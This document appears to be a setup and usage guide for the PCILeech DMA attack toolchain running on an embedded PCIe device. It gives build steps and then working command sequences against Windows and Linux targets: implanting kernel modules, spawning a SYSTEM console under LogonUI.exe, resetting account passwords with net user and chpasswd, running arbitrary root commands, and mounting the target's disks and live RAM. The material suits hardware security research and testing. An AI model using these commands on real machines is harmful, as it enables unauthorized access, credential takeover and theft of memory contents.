# PCILeech setup
On the embedded platform

Install dependencies

```shell
sudo apt install libusb-1.0-0-dev build-essential pkgconf liblz4-dev libfuse-dev
```

```shell
mkdir PCILeech && cd PCILeech
# Clone Leechcore
git clone https://github.com/ufrisk/LeechCore.git
# Clone Leechcore-plugins
git clone https://github.com/rwk-git/LeechCore-plugins.git --branch generic --single-branch
# Clone MemProcFS
git clone https://github.com/ufrisk/MemProcFS.git
# Clone PCILeech
git clone https://github.com/ufrisk/pcileech.git

# Build the LeechCore library
pushd LeechCore/leechcore
make
popd
# Build the MemProcFS library
pushd MemProcFS/vmm
make
cd ../memprocfs
make
popd
# Build the LeechCore plugin
pushd LeechCore-plugins/leechcore_device_generic
make
popd
# Build PCI Leech
pushd pcileech/pcileech
make
cd ../files
cp ../../LeechCore-plugins/files/leechcore_device_generic.so .
popd
```

# PCILeech usage examples

In the embedded platform, go in the `PCILeech/pcileech/files` directory as that is where the executable and libraries are.

## Windows target

- Implant kernel module with `sudo ./pcileech kmdload -kmd WIN10_X64_3 -device 'generic://dev=/dev/pci-io'`
- Save the returned Kernel Module Address with `export KMD=0x7ffff000` here you manually have to type the address returned above
- List processes with `sudo ./pcileech -kmd $KMD wx64_pslist  -device 'generic://dev=/dev/pci-io'`
- Search for login process with `sudo ./pcileech -kmd $KMD wx64_pslist  -device 'generic://dev=/dev/pci-io' | grep -A 1 LogonUI.exe | sed 's/.*PID=\(.*\)|.*/\1/p' | tail -n1`
- Open a console with `sudo ./pcileech -kmd $KMD wx64_pscreate -0 0x$(sudo ./pcileech -kmd $KMD wx64_pslist  -device 'generic://dev=/dev/pci-io' | grep -A 1 LogonUI.exe | sed 's/.*PID=\(.*\)|.*/\1/p' | tail -n1) -s 'C:\Windows\System32\cmd.exe' -1 0x08000000 -2 0x1  -device 'generic://dev=/dev/pci-io'`
  Here a nested command is used to get the PID of the LogonUI.exe process in Windows, then a command line is opened
- Change the password with `net user <username> <password>` e.g., `net user admin 1234`
- This is a system (Windows jargon for *root*) console, you can do anything from here.

**Notes:** In the examples above I use `LogonUI.exe` as parent process, this is only available on the login screen, choose another process in other circumstances.

### Mount all Windows file systems and system RAM

- Create a mountpoint somewhere in your file system `mkdir -p /home/ubuntu/target`
- Mount the windows file systems and RAM with `sudo ./pcileech mount -mount /home/ubuntu/target/ -kmd $KMD -device 'generic://dev=/dev/pci-io'`

```
root@ENVME:~# ls /home/ubuntu/target/
files  liveram-kmd.raw	liveram-native.raw
# Read the RAM natively (through PCIe), for example here data is shown for the low addresses
root@ENVME:~# xxd /home/ubuntu/target/liveram-native.raw | head -n 1000
# Read the RAM through the kernel module, for example here these low addresses cannot be accessed, therefore read as 0
root@ENVME:~# xxd /home/ubuntu/target/liveram-kmd.raw | head -n 1000
# Check the taget file systems
root@ENVME:~# ls /home/ubuntu/target/files/c/
'$Recycle.Bin'		   PerfLogs		        Users
'$WinREAgent'		  'Program Files'	        Windows
'Documents and Settings'  'Program Files (x86)'         hiberfil.sys
 DumpStack.log		   ProgramData		        pagefile.sys
 DumpStack.log.tmp	   Recovery		        swapfile.sys
 Intel			  'System Volume Information'
```

## Linux target

- Implant kernel module with `sudo ./pcileech kmdload -kmd LINUX_X64_48 -device 'generic://dev=/dev/pci-io'`
- Save the returned Kernel Module Address with `export KMD=0x60000000` here you manually have to type the address returned above
- Send any command as root `sudo ./pcileech -kmd $KMD lx64_exec_root -s "echo '<user>:<password>' | chpasswd" -1 1 -device 'generic://dev=/dev/pci-io'`
  For example `sudo ./pcileech -kmd $KMD lx64_exec_root -s "echo 'reds:1234' | chpasswd" -1 1 -device 'generic://dev=/dev/pci-io'`
  Or turn off the computer (properly) `sudo ./pcileech -kmd $KMD lx64_exec_root -s "poweroff" -1 1 -device 'generic://dev=/dev/pci-io'`